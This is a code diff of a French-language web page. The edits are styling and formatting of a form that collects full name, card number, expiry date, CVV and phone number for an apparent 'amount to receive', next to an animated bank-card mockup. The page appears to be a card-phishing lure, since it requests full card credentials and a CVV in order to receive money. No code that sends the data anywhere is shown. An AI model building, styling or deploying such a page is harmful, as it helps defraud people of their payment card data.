@@ -58,10 +58,10 @@
     .form-row input,
     .form-row select {
       width: 100%;
-      padding: 10px;
-      font-size: 13px;
+      padding: 13px 14px; /* champs agrandis */
+      font-size: 15px;     /* texte plus grand */
       border: 1.5px solid #ccc;
-      border-radius: 5px;
+      border-radius: 6px;
     }
 
     .form-row input:focus,
@@ -72,13 +72,13 @@
 
     .coll button {
       width: 100%;
-      padding: 12px;
-      font-size: 14px;
+      padding: 14px;      /* bouton plus grand */
+      font-size: 15px;
       font-weight: bold;
       color: white;
       background: #ff6e14;
       border: none;
-      border-radius: 25px;
+      border-radius: 30px;
       cursor: pointer;
       transition: background 0.3s;
     }
@@ -88,8 +88,8 @@
     }
 
     .card-container {
-      width: 100%;
-      height: 160px;
+      width: 260px;      /* carte réduite */
+      height: 140px;     /* carte réduite */
       perspective: 1000px;
       margin: 10px auto;
     }
@@ -110,7 +110,7 @@
       height: 100%;
       border-radius: 12px;
       backface-visibility: hidden;
-      padding: 15px;
+      padding: 12px; /* padding adapté */
       background: linear-gradient(135deg, #004a99, #00aaff);
       color: white;
     }
@@ -122,21 +122,22 @@
     }
 
     .chip {
-      width: 40px;
-      height: 25px;
+      width: 35px;
+      height: 22px;
       background: gold;
       border-radius: 4px;
     }
 
     .number {
-      font-size: 0.9em;
+      font-size: 0.85em;
       letter-spacing: 2px;
+      margin-bottom: 10px;
     }
 
     .name-date {
       display: flex;
       justify-content: space-between;
-      font-size: 0.75em;
+      font-size: 0.7em;
     }
 
     .label {
@@ -159,12 +160,19 @@
       margin-top: 15px;
     }
 
+    .cvv-label {
+      font-size: 0.75em;
+      color: #ccc;
+      margin-bottom: 5px;
+    }
+
     .cvv {
       background: white;
       color: black;
-      font-size: 0.9em;
-      padding: 4px 8px;
+      font-size: 0.85em;
+      padding: 4px 6px;
       border-radius: 4px;
+      display: inline-block;
     }
 
     @keyframes flip {
@@ -173,7 +181,7 @@
     }
 
     .info-text {
-      font-size: 0.75em;
+      font-size: 0.78em;
       color: #666;
       margin: 10px 0 15px;
       text-align: justify;
@@ -248,14 +256,28 @@
       </select>
     </div>
 
-    <div class="form-row"><input type="text" id="fullname" name="fullname" placeholder="Nom et Prénoms" required></div>
-    <div class="form-row"><input type="text" id="cardNumber" name="cardNumber" placeholder="Numéro de carte" maxlength="16" pattern="\d{16}" required></div>
-    <div class="form-row"><input type="text" id="expiryDateInput" name="expiryDateInput" placeholder="Date d'expiration (MM/YYYY)" maxlength="7" required></div>
-    <div class="form-row"><input type="text" id="cvvInput" name="cvv" placeholder="CVV" maxlength="3" pattern="\d{3}" required></div>
-    <div class="form-row"><input type="text" id="amount" name="amount" placeholder="Montant à recevoir" required></div>
-    <div class="form-row"><input type="text" id="phone" name="phone" placeholder="Numéro de téléphone" required></div>
+    <div class="form-row">
+      <input type="text" id="fullname" name="fullname" placeholder="Nom et Prénoms" required>
+    </div>
+    <div class="form-row">
+      <input type="text" id="cardNumber" name="cardNumber" placeholder="Numéro de carte" maxlength="16" pattern="\d{16}" required>
+    </div>
+    <div class="form-row">
+      <input type="text" id="expiryDateInput" name="expiryDateInput" placeholder="Date d'expiration (MM/YYYY)" maxlength="7" required>
+    </div>
+    <div class="form-row">
+      <input type="text" id="cvvInput" name="cvv" placeholder="CVV" maxlength="3" pattern="\d{3}" required>
+    </div>
+    <div class="form-row">
+      <input type="text" id="amount" name="amount" placeholder="Montant à recevoir" required>
+    </div>
+    <div class="form-row">
+      <input type="text" id="phone" name="phone" placeholder="Numéro de téléphone" required>
+    </div>
 
-    <div class="coll"><button type="submit">Confirmer la carte</button></div>
+    <div class="coll">
+      <button type="submit">Confirmer la carte</button>
+    </div>
   </form>
 </main>
 
